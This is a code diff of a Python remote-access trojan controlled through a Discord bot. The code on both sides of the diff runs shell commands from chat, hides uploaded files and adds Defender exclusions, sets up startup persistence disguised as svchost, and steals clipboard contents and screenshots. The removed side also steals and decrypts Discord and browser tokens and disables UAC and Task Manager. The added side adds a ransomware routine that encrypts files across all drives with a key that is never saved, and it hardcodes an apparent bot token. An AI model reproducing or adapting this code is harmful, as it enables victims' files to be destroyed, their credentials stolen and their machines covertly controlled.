@@ -1,659 +1,350 @@
+import os
+import certifi
+os.environ['SSL_CERT_FILE'] = certifi.where()
+import sys
+import ctypes
 import discord
 from discord.ext import commands
-from discord import File
-import requests
-import psutil
-import platform
-import webbrowser
-import mss
 import subprocess
-from pathlib import Path
-import pyautogui
-import shutil
 import tempfile
-import os
-import ctypes   
-from urllib.parse import urlparse
-import cv2
-import pyperclip
 import io
-import re
-import json
-import base64
-import sqlite3
-from Crypto.Cipher import AES
+import random
+import string
+import shutil
+import webbrowser
+import platform
+import winreg
+import psutil
+import pyperclip
+import pyautogui
+import mss
+from PIL import ImageGrab, Image
+import requests
+import threading
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+import secrets
+import asyncio
 
-if platform.system() == "Windows":
-    import winreg
-    from win32 import win32crypt
-else:
-    winreg = None
-
-
-TOKEN = "BOT_TOKEN"
+TOKEN = "MTM4Nzc5MDIwMzc1Mzg2MTEzMA.G4EGZt.EjlJgApqBuYBD1NcfEJNVqYGqrF8hphyNy_kXQ"
 
 intents = discord.Intents.default()
 intents.message_content = True
-
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-bot.remove_command('help')
+encrypted_count = 0
+count_lock = threading.Lock()
+self_path = os.path.abspath(sys.argv[0])
+key = secrets.token_bytes(32)
+crypt_lock = asyncio.Lock()
+total_files = 0
 
-@bot.command()
-async def help(ctx):
-    help_embed = discord.Embed(
-        title="Bot Command Help",
-        description="Here are all available commands:",
-        color=discord.Color.blue()
-    )
-    
-    commands_list = [
-        ("!getcam", "Check available cameras and capture images"),
-        ("!token", "Retrieve Discord tokens from the system"),
-        ("!upload", "Upload a file to the system (attach with command)"),
-        ("!startup", "Add the bot to startup for persistence"),
-        ("!clipboard", "Get current clipboard contents (text or image)"),
-        ("!blockinput", "Block keyboard and mouse input"),
-        ("!unblockinput", "Unblock keyboard and mouse input"),
-        ("!inputstatus", "Check if input is currently blocked"),
-        ("!uacbypass [disable/enable/status]", "Control UAC settings (admin required)"),
-        ("!enbtaskmngr", "Enable Task Manager"),
-        ("!disbltaskmngr", "Disable Task Manager"),
-        ("!taskkill <PID/name> [force]", "Kill a process by PID or name (add 'force' to force kill)"),
-        ("!tasklist", "List running processes"),
-        ("!website <url>", "Open a website in default browser"),
-        ("!cmd <command>", "Execute a command in the shell"),
-        ("!message <text>", "Show a message box with the given text"),
-        ("!pcinfo", "Get system information"),
-        ("!screen", "Capture and send a screenshot"),
-        ("!help", "Show this help message")
-    ]
-    
-    for cmd, desc in commands_list:
-        help_embed.add_field(name=cmd, value=desc, inline=False)
-    
-    help_embed.set_footer(text="Use commands responsibly")
-    
-    await ctx.send(embed=help_embed)
+def encrypt_file(file_path, new_ext):
+    global encrypted_count
 
-@bot.command()
-async def getcam(ctx):
+    if os.path.abspath(file_path) == self_path:
+        return False
+
     try:
-        camera_info = []
-        
-        for i in range(0, 5):
-            cap = cv2.VideoCapture(i)
-            if cap.isOpened():
-                width = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
-                height = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
-                fps = cap.get(cv2.CAP_PROP_FPS)
-                
-                camera_info.append({
-                    'index': i,
-                    'resolution': f"{int(width)}x{int(height)}",
-                    'fps': fps
-                })
-                cap.release()
-        
-        if camera_info:
-            message = "**Available Cameras:**\n"
-            for cam in camera_info:
-                message += (f"📹 Camera {cam['index']} - "
-                          f"{cam['resolution']} @ {cam['fps']:.1f}FPS\n")
-            
-            await ctx.send(message)
-            
-            for cam in camera_info:
-                try:
-                    cap = cv2.VideoCapture(cam['index'])
-                    ret, frame = cap.read()
-                    if ret:
-                        filename = f"camera_{cam['index']}.jpg"
-                        cv2.imwrite(filename, frame)
-                        await ctx.send(
-                            f"Sample from Camera {cam['index']}:",
-                            file=discord.File(filename)
-                        )
-                        os.remove(filename)
-                    cap.release()
-                except:
-                    await ctx.send(f"Failed to capture from Camera {cam['index']}")
-        else:
-            await ctx.send("🔴 No cameras detected")
-            
-    except Exception as e:
-        await ctx.send(f"❌ Camera check failed: {str(e)}")
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        if not data:
+            return False
 
-def decrypt_token(encrypted_token, key):
+        iv = secrets.token_bytes(16)
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+
+        pad_len = 16 - (len(data) % 16)
+        data += bytes([pad_len] * pad_len)
+
+        ct = encryptor.update(data) + encryptor.finalize()
+        encrypted_data = iv + ct
+
+        new_file = file_path + '.' + new_ext
+        with open(new_file, 'wb') as f:
+            f.write(encrypted_data)
+
+        os.remove(file_path)
+
+        with count_lock:
+            encrypted_count += 1
+
+        return True
+
+    except Exception:
+        return False
+
+def scan_count_files(directory):
+    count = 0
     try:
-        iv = encrypted_token[3:15]
-        payload = encrypted_token[15:]
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        decrypted = cipher.decrypt(payload)
-        return decrypted[:-16].decode()
-    except:
-        return None
-
-def get_encryption_key(local_state_path):
-    try:
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.loads(f.read())
-        
-        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
-        encrypted_key = encrypted_key[5:]
-        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-    except:
-        return None
-
-def grab_tokens():
-    tokens = []
-    regexes = [
-        r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
-        r"mfa\.[\w-]{84}"
-    ]
-    
-    paths = [
-        os.path.join(os.getenv('APPDATA'), 'Discord'),
-        os.path.join(os.getenv('APPDATA'), 'discordptb'),
-        os.path.join(os.getenv('APPDATA'), 'discordcanary'),
-        os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
-    ]
-    
-    for path in paths:
-        leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
-        local_state_path = os.path.join(path, 'Local State')
-        
-        if not os.path.exists(leveldb_path) or not os.path.exists(local_state_path):
-            continue
-            
-        key = get_encryption_key(local_state_path)
-        if not key:
-            continue
-            
-        for file in os.listdir(leveldb_path):
-            if not file.endswith('.ldb') and not file.endswith('.log'):
+        for entry in os.scandir(directory):
+            if entry.name in ('.', '..'):
                 continue
-                
-            try:
-                with open(os.path.join(leveldb_path, file), 'r', encoding='utf-8', errors='ignore') as f:
-                    content = f.read()
-                    
-                    for regex in regexes:
-                        for match in re.findall(regex, content):
-                            tokens.append(match)
-                            
-                    encrypted_matches = re.findall(r"dQw4w9WgXcQ:[^\"]*", content)
-                    for match in encrypted_matches:
-                        encrypted_token = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
-                        decrypted = decrypt_token(encrypted_token, key)
-                        if decrypted:
-                            tokens.append(decrypted)
-            except:
+            full_path = entry.path
+            if entry.is_dir(follow_symlinks=False):
+                count += scan_count_files(full_path)
+            elif entry.is_file(follow_symlinks=False):
+                count += 1
+    except (PermissionError, FileNotFoundError):
+        pass
+    except Exception:
+        pass
+    return count
+
+def scan_and_encrypt(directory, new_ext, progress_callback=None):
+    try:
+        for entry in os.scandir(directory):
+            if entry.name in ('.', '..'):
                 continue
-                
-    return list(set(tokens))
+            full_path = entry.path
+            if entry.is_dir(follow_symlinks=False):
+                scan_and_encrypt(full_path, new_ext, progress_callback)
+            elif entry.is_file(follow_symlinks=False):
+                if encrypt_file(full_path, new_ext) and progress_callback:
+                    progress_callback()
+    except (PermissionError, FileNotFoundError):
+        pass
+    except Exception:
+        pass
 
-def get_token_info(token):
+def get_logical_drives():
+    drives = []
+    bitmask = ctypes.cdll.kernel32.GetLogicalDrives()
+    for i in range(26):
+        if bitmask & (1 << i):
+            drives.append(chr(65 + i) + ':\\')
+    return drives
+
+@bot.command(help="Encrypts all files, new extension must be specified (e.g. !crypt locked)")
+async def crypt(ctx, new_ext: str):
+    global encrypted_count, total_files
+
+    if crypt_lock.locked():
+        await ctx.send("An encryption process is already running. Please wait until it finishes.")
+        return
+
+    async with crypt_lock:
+        new_ext = new_ext.strip().lstrip('.')
+        if not new_ext.isalnum():
+            await ctx.send("Extension must contain only letters and numbers.")
+            return
+
+        encrypted_count = 0
+        total_files = 0
+
+        await ctx.send("🔍 Scanning files, please wait...")
+
+        drives = get_logical_drives()
+        user_profile = os.environ.get('USERPROFILE')
+
+        def count_all_files():
+            global total_files
+            for d in drives:
+                total_files += scan_count_files(d)
+            if user_profile:
+                total_files += scan_count_files(user_profile)
+
+        loop = asyncio.get_running_loop()
+        await loop.run_in_executor(None, count_all_files)
+
+        if total_files == 0:
+            await ctx.send("No files found.")
+            return
+
+        await ctx.send(f"🔐 Encryption started ({total_files} files found)...")
+
+        def progress_callback():
+            global encrypted_count
+            with count_lock:
+                encrypted_count += 1
+
+        tasks = []
+        for drive in drives:
+            tasks.append(asyncio.to_thread(scan_and_encrypt, drive, new_ext, progress_callback))
+        if user_profile:
+            tasks.append(asyncio.to_thread(scan_and_encrypt, user_profile, new_ext, progress_callback))
+
+        await asyncio.gather(*tasks)
+
+        await ctx.send(f"✅ Encryption completed.\nTotal files: {total_files}\nEncrypted files: {encrypted_count}")
+
+def hide_file_path(file_path):
     try:
-        headers = {'Authorization': token}
-        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
-        if response.status_code == 200:
-            return response.json()
+        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
     except:
-        return None
-    return None
+        pass
 
-@bot.command()
-async def token(ctx):
-    try:
-        tokens = grab_tokens()
-        if not tokens:
-            await ctx.send("❌ No tokens found")
-            return
-            
-        results = []
-        for token in tokens:
-            info = get_token_info(token)
-            if info:
-                results.append({
-                    'token': token,
-                    'username': f"{info['username']}#{info['discriminator']}",
-                    'email': info.get('email', 'N/A'),
-                    'phone': info.get('phone', 'N/A'),
-                    'verified': info.get('verified', False)
-                })
-        
-        if not results:
-            await ctx.send("ℹ Found tokens but couldn't validate them")
-            return
-            
-        message = "**Found Valid Tokens:**\n"
-        for i, result in enumerate(results, 1):
-            message += (
-                f"\n**Token {i}**\n"
-                f"👤 User: {result['username']}\n"
-                f"📧 Email: {result['email']}\n"
-                f"📱 Phone: {result['phone']}\n"
-                f"✅ Verified: {result['verified']}\n"
-                f"🔑 Token: ||{result['token']}||\n"
-            )
-
-        if len(message) > 2000:
-            parts = [message[i:i+2000] for i in range(0, len(message), 2000)]
-            for part in parts:
-                await ctx.send(part)
-        else:
-            await ctx.send(message)
-            
-    except Exception as e:
-        await ctx.send(f"❌ Error: {str(e)}")
-
-
-@bot.command()
+@bot.command(help="Uploads a file and tries to add Defender exclusion")
 async def upload(ctx):
     try:
         if not ctx.message.attachments:
-            return await ctx.send("❌ Please attach a file")
+            return await ctx.send("❌ No file attached.")
 
         attachment = ctx.message.attachments[0]
         filename = attachment.filename
-        
-        import random
-        import string
-        new_filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + os.path.splitext(filename)[1]
-        
-        temp_dir = tempfile.gettempdir()
-        file_path = os.path.join(temp_dir, new_filename)
-        
-        msg = await ctx.send(f"⬇️ Downloading {filename}...")
-        await attachment.save(file_path)
-        
-        ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)
-        
-        success = False
+        new_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + os.path.splitext(filename)[1]
+        path = os.path.join(tempfile.gettempdir(), new_name)
+
+        await attachment.save(path)
+        hide_file_path(path)
+
         try:
-            ps_command = f"""Start-Process powershell -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath "{file_path}"'"""
-            subprocess.run(ps_command, shell=True, timeout=10)
-            success = True
+            subprocess.run(f"powershell Add-MpPreference -ExclusionPath '{path}'", shell=True, timeout=5)
+            defender = "Yes"
         except:
-            try:
-                with winreg.OpenKey(
-                    winreg.HKEY_LOCAL_MACHINE,
-                    r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths",
-                    0, winreg.KEY_SET_VALUE
-                ) as key:
-                    winreg.SetValueEx(key, file_path, 0, winreg.REG_DWORD, 0)
-                success = True
-            except:
-                pass
+            defender = "No"
 
-        response = (
-            f"✅ **File deployed successfully**\n"
-            f"📂 **Location**: `{file_path}`\n"
-            f"👻 **Hidden**: Yes\n"
-            f"🛡️ **Defender Exclusion**: {'Yes' if success else 'Failed'}\n"
-            f"📦 **Original Name**: {filename}"
-        )
-        
-        await msg.edit(content=response)
-        
+        await ctx.send(f"✅ File uploaded\n📂 Path: `{path}`\n🛡️ Defender Exclusion: {defender}")
     except Exception as e:
-        await ctx.send(f"❌ **Error**: {str(e)}")
+        await ctx.send(f"Error: {e}")
 
-
-@bot.command()
+@bot.command(help="Adds the bot to Windows startup hidden")
 async def startup(ctx):
     try:
-        current_file = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
-        file_name = os.path.basename(current_file)
-        
-        startup_folder = os.path.join(
-            os.getenv('APPDATA'),
-            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
-        )
-        startup_copy = os.path.join(startup_folder, file_name)
-        
-        if not os.path.exists(startup_copy):
-            shutil.copy2(current_file, startup_copy)
-            msg1 = "✓ Added to Startup folder\n"
+        current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
+
+        if getattr(sys, 'frozen', False):
+            file_ext = '.exe'
         else:
-            msg1 = "⚠ Already in Startup folder\n"
-        
-        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        try:
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ) as key:
-                existing_value = winreg.QueryValueEx(key, "DiscordBot")[0]
-                if existing_value == startup_copy:
-                    msg2 = "⚠ Already in Registry"
-                else:
-                    msg2 = "✓ Updated Registry entry"
-        except FileNotFoundError:
-            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
-                winreg.SetValueEx(key, "DiscordBot", 0, winreg.REG_SZ, startup_copy)
-            msg2 = "✓ Added to Registry"
-        
-        await ctx.send(f"**Startup Persistence:**\n{msg1}{msg2}")
-        
-    except Exception as e:
-        await ctx.send(f"❌ Error during persistence setup: {str(e)}")
+            file_ext = '.py'
 
-@bot.command()
-async def clipboard(ctx):
-    """Send current clipboard contents (text or image)"""
-    try:
-        try:
-            clipboard_text = pyperclip.paste()
-            if clipboard_text.strip():
-                if len(clipboard_text) > 1500:
-                    with io.StringIO(clipboard_text) as file:
-                        await ctx.send("📋 Text clipboard:", 
-                                    file=discord.File(file, filename="clipboard.txt"))
-                else:
-                    await ctx.send(f"📋 Text clipboard:\n```{clipboard_text}```")
-                return
-        except:
-            pass
+        target_folder = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Windows', 'svchost')
+        os.makedirs(target_folder, exist_ok=True)
 
-        try:
-            img = ImageGrab.grabclipboard()
-            if img:
-                with io.BytesIO() as image_binary:
-                    img.save(image_binary, format='PNG')
-                    image_binary.seek(0)
-                    await ctx.send("🖼️ Image from clipboard:", 
-                                 file=discord.File(image_binary, filename="clipboard.png"))
-                return
-        except:
-            pass
+        target_filename = f"svchost{file_ext}"
+        target_path = os.path.join(target_folder, target_filename)
 
-        await ctx.send("ℹ️ Clipboard is empty or contains unsupported data")
+        if not os.path.exists(target_path):
+            shutil.copy2(current_path, target_path)
+            ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)
 
+        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        random_key = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_READ) as key:
+            existing_keys = [winreg.EnumValue(key, i)[0] for i in range(winreg.QueryInfoKey(key)[1])]
+
+        if random_key not in existing_keys:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, random_key, 0, winreg.REG_SZ, target_path)
+            message = f"✓ Added to startup hidden: {random_key}"
+        else:
+            message = "⚠ Already registered in startup"
+
+        await ctx.send(message)
     except Exception as e:
         await ctx.send(f"❌ Error: {str(e)}")
 
-
-input_blocked = False
-
-@bot.command()
-async def blockinput(ctx):
-    global input_blocked
-    
+@bot.command(help="Sends clipboard content (text or image)")
+async def clipboard(ctx):
     try:
-        ctypes.windll.user32.BlockInput(True)
-        input_blocked = True
-        
-        await ctx.send("⚠️ Keyboard and mouse input BLOCKED")
-    except Exception as e:
-        await ctx.send(f"❌ Error blocking input: {str(e)}")
-
-@bot.command()
-async def unblockinput(ctx):
-    """Unblock keyboard and mouse input"""
-    global input_blocked
-    
-    try:
-        ctypes.windll.user32.BlockInput(False)
-        input_blocked = False
-        
-        await ctx.send("✅ Keyboard and mouse input UNBLOCKED")
-    except Exception as e:
-        await ctx.send(f"❌ Error unblocking input: {str(e)}")
-
-@bot.command()
-async def inputstatus(ctx):
-    """Check input block status"""
-    global input_blocked
-    status = "BLOCKED" if input_blocked else "UNBLOCKED"
-    await ctx.send(f"ℹ️ Current input status: {status}")
-
-@bot.command()
-async def uacbypass(ctx, action: str = "disable"):
-    """Control UAC settings (disable/enable/status)"""
-    try:
-        if not ctypes.windll.shell32.IsUserAnAdmin():
-            await ctx.send("❌ Administrator privileges required")
+        content = pyperclip.paste()
+        if content.strip():
+            if len(content) > 1500:
+                with io.StringIO(content) as f:
+                    await ctx.send(file=discord.File(f, filename="clipboard.txt"))
+            else:
+                await ctx.send(f"```{content}```")
             return
 
-        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-        values = ["EnableLUA", "ConsentPromptBehaviorAdmin", "PromptOnSecureDesktop"]
-        
-        backup = {}
-        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
-            for val in values:
-                try:
-                    backup[val] = winreg.QueryValueEx(key, val)[0]
-                except:
-                    backup[val] = None
+        img = ImageGrab.grabclipboard()
+        if isinstance(img, Image.Image):
+            with io.BytesIO() as b:
+                img.save(b, format='PNG')
+                b.seek(0)
+                await ctx.send(file=discord.File(b, filename="clipboard.png"))
+            return
 
-        if action.lower() == "disable":
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
-                winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
-                winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
-                winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
-            await ctx.send("⚠️ UAC completely disabled - RESTART REQUIRED")
-            
-        elif action.lower() == "enable":
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
-                for val, data in backup.items():
-                    if data is not None:
-                        winreg.SetValueEx(key, val, 0, winreg.REG_DWORD, data)
-            await ctx.send("✅ UAC protections restored - RESTART REQUIRED")
-            
-        elif action.lower() == "status":
-            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
-                uac_status = winreg.QueryValueEx(key, "EnableLUA")[0]
-            status = "ENABLED" if uac_status else "DISABLED"
-            await ctx.send(f"ℹ️ Current UAC Status: {status}")
-            
-        else:
-            await ctx.send("❌ Invalid action. Use: disable/enable/status")
-            
+        await ctx.send("Clipboard is empty or unsupported content.")
     except Exception as e:
-        await ctx.send(f"❌ Error: {str(e)}")
+        await ctx.send(f"Error: {e}")
 
-@bot.command()
-async def enbtaskmngr(ctx):
-    """Enable Task Manager"""
-    try:
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
-            0, winreg.KEY_SET_VALUE
-        )
-        
-        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
-        winreg.CloseKey(key)
-        
-        await ctx.send("✅ Task Manager has been enabled")
-    except Exception as e:
-        await ctx.send(f"❌ Error enabling Task Manager: {str(e)}")
-
-@bot.command()
-async def disbltaskmngr(ctx):
-    """Disable Task Manager"""
-    try:
-        try:
-            key = winreg.OpenKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
-                0, winreg.KEY_SET_VALUE
-            )
-        except FileNotFoundError:
-            key = winreg.CreateKey(
-                winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
-            )
-        
-        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
-        winreg.CloseKey(key)
-        
-        await ctx.send("⚠️ Task Manager has been disabled")
-    except Exception as e:
-        await ctx.send(f"❌ Error disabling Task Manager: {str(e)}")
-
-
-@bot.command()
-async def taskkill(ctx, process_identifier: str, force: str = None):
-    try:
-        killed = []
-        force_kill = force and force.lower() == 'force'
-        
-        if process_identifier.isdigit():
-            try:
-                proc = psutil.Process(int(process_identifier))
-                if force_kill:
-                    proc.kill()
-                    killed.append(f"☠️ Process with PID {process_identifier} force killed")
-                else:
-                    proc.terminate()
-                    killed.append(f"✓ Process with PID {process_identifier} terminated")
-            except psutil.NoSuchProcess:
-                await ctx.send(f"❌ No process with PID {process_identifier} found")
-            except psutil.AccessDenied:
-                await ctx.send(f"⚠️ Permission denied to kill PID {process_identifier}")
-        
-        else:
-            found = False
-            for proc in psutil.process_iter(['pid', 'name']):
-                try:
-                    if proc.info['name'].lower() == process_identifier.lower():
-                        if force_kill:
-                            psutil.Process(proc.info['pid']).kill()
-                            killed.append(f"☠️ {proc.info['name']} (PID: {proc.info['pid']}) force killed")
-                        else:
-                            psutil.Process(proc.info['pid']).terminate()
-                            killed.append(f"✓ {proc.info['name']} (PID: {proc.info['pid']}) terminated")
-                        found = True
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    continue
-            
-            if not found:
-                await ctx.send(f"❌ No processes named '{process_identifier}' found")
-        
-        if killed:
-            response = "\n".join(killed)
-            if force_kill:
-                response += "\n⚠️ Force kill may cause data loss!"
-            await ctx.send(response)
-    
-    except Exception as e:
-        await ctx.send(f"❌ Error: {str(e)}")
-
-@bot.command()
+@bot.command(help="Lists running processes")
 async def tasklist(ctx):
     try:
-        processes = []
-        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'username']):
-            try:
-                processes.append(proc.info)
-            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                pass
-
-        headers = ["PID", "Name", "CPU %", "Memory %", "User"]
-        process_list = "\t".join(headers) + "\n"
-        process_list += "-"*60 + "\n"
-        
-        for proc in sorted(processes, key=lambda p: p['memory_percent'], reverse=True)[:30]:  # Top 30
-            line = f"{proc['pid']}\t{proc['name'][:12]}\t{proc['cpu_percent']:.1f}\t{proc['memory_percent']:.1f}\t{proc['username'] or 'SYSTEM'}"
-            process_list += line + "\n"
-
-        chunks = [process_list[i:i+1900] for i in range(0, len(process_list), 1900)]
-        for chunk in chunks:
-            await ctx.send(f"```{chunk}```")
-
+        processes = [f"{p.info['pid']}\t{p.info['name'][:12]}\t{p.info['cpu_percent']:.1f}\t{p.info['memory_percent']:.1f}" for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]
+        message_parts = ["```PID\tName\tCPU\tMemory"] + processes[:30] + ["```"]
+        await ctx.send("\n".join(message_parts))
     except Exception as e:
-        await ctx.send(f"❌ Error: {str(e)}")
+        await ctx.send(f"Error: {e}")
 
-@bot.command()
-async def website(ctx, *, url: str):
+@bot.command(help="Terminates process by name (e.g. !taskkill chrome.exe)")
+async def taskkill(ctx, name: str):
     try:
-        url = url.strip()
-        
-        url = url.replace('https://', '').replace('http://', '')
-        
-        webbrowser.open(f'https://{url}')
-        
-        await ctx.send(f"✅ Website opened: {url}")
-        
+        for p in psutil.process_iter(['pid', 'name']):
+            if p.info['name'].lower() == name.lower():
+                psutil.Process(p.info['pid']).terminate()
+                await ctx.send(f"✓ {name} terminated")
+                return
+        await ctx.send("Not found")
     except Exception as e:
-        await ctx.send(f"❌ Error: {str(e)}")
-@bot.command()
+        await ctx.send(f"Error: {e}")
+
+@bot.command(help="Runs a command in the shell")
 async def cmd(ctx, *, command: str):
     try:
-        process = subprocess.Popen(
-            command,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE
-        )
-        
-        output, error = process.communicate()
-        
-        result = output.decode('utf-8', errors='replace') if output else ""
-        error_msg = error.decode('utf-8', errors='replace') if error else ""
-        
-        full_result = f"Output:\n{result}\nError:\n{error_msg}" if error_msg else f"Output:\n{result}"
-        
-        if len(full_result) > 2000:
-            for i in range(0, len(full_result), 2000):
-                await ctx.send(f"```{full_result[i:i+2000]}```")
-        else:
-            await ctx.send(f"```{full_result}```")
-            
+        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = proc.communicate()
+        output_decoded = output.decode(errors='replace') or ""
+        error_decoded = error.decode(errors='replace') or ""
+        full_text = f"Output:\n{output_decoded}\nError:\n{error_decoded}" if error_decoded else f"Output:\n{output_decoded}"
+        await ctx.send(f"```{full_text[:1900]}```")
     except Exception as e:
-        await ctx.send(f"Error executing command: {str(e)}")
+        await ctx.send(f"Error: {e}")
 
-@bot.command()
-async def message(ctx, *, input_message: str):
-    try:
-        pyautogui.alert(text=input_message, button='OK')
-        await ctx.send(f"Message displayed successfully: '{input_message}'")
-    except Exception as e:
-        await ctx.send(f"Error occurred: {e}")
-
-
-@bot.command()
+@bot.command(help="Sends system information")
 async def pcinfo(ctx):
     try:
-        ip_data = requests.get("http://ip-api.com/json/").json()
-        ip = ip_data.get("query", "Unknown")
-        city = ip_data.get("city", "Unknown")
-        region = ip_data.get("regionName", "Unknown")
-        country = ip_data.get("country", "Unknown")
-
-        ram = psutil.virtual_memory().total / (1024 ** 3)
-
-        disk = psutil.disk_usage('/').total / (1024 ** 3)
-
-        os_info = platform.system() + " " + platform.release()
-
-        info_message = (
-            f"📡 IP Address: {ip}\n"
-            f"🧭 Location: {city}, {region}, {country}\n"
-            f"💻 Operating System: {os_info}\n"
-            f"💾 Storage (total): {disk:.2f} GB\n"
-            f"🧠 RAM (total): {ram:.2f} GB"
-        )
-
-        await ctx.send(f"**System Information:**\n```{info_message}```")
-
+        ip_info = requests.get("http://ip-api.com/json/").json()
+        ram_gb = psutil.virtual_memory().total / (1024 ** 3)
+        disk_gb = psutil.disk_usage('/').total / (1024 ** 3)
+        os_info = f"{platform.system()} {platform.release()}"
+        await ctx.send(f"📡 IP: {ip_info.get('query')}\n📍 Location: {ip_info.get('city')}, {ip_info.get('country')}\n💻 OS: {os_info}\n💾 Disk: {disk_gb:.2f} GB\n🧠 RAM: {ram_gb:.2f} GB")
     except Exception as e:
-        await ctx.send(f"Error occurred: {e}")
+        await ctx.send(f"Error: {e}")
 
-
-@bot.command()
+@bot.command(help="Takes a screenshot and sends it")
 async def screen(ctx):
-    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
+    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
         with mss.mss() as sct:
-            sct.shot(output=tmp_file.name)
+            sct.shot(output=f.name)
         try:
-            await ctx.send(file=discord.File(tmp_file.name))
+            await ctx.send(file=discord.File(f.name))
         finally:
-            os.remove(tmp_file.name)
+            os.remove(f.name)
 
+@bot.command(help="Opens the specified URL in the default browser")
+async def website(ctx, *, url: str):
+    try:
+        if not url.startswith("http"):
+            url = "https://" + url
+        webbrowser.open(url)
+        await ctx.send(f"Website opened: {url}")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
 
-bot.run(TOKEN)
+@bot.command(help="Shows a message box on the screen")
+async def message(ctx, *, message_text: str):
+    try:
+        pyautogui.alert(message_text)
+        await ctx.send("Message displayed")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+
+@bot.command(help="Shows the list of commands")
+async def help(ctx):
+    help_text = "**Command List:**\n"
+    for cmd in bot.commands:
+        desc = cmd.help if cmd.help else "No description"
+        help_text += f"• `!{cmd.name}` — {desc}\n"
+
+    if len(help_text) > 2000:
+        chunks = [help_text[i:i+1900] for i in range(0, len(help_text), 1900)]
+        for chunk in chunks:
+            await ctx.send(chunk)
+    else:
+        await ctx.send(help_text)
+
+if __name__ == "__main__":
+    bot.run(TOKEN)
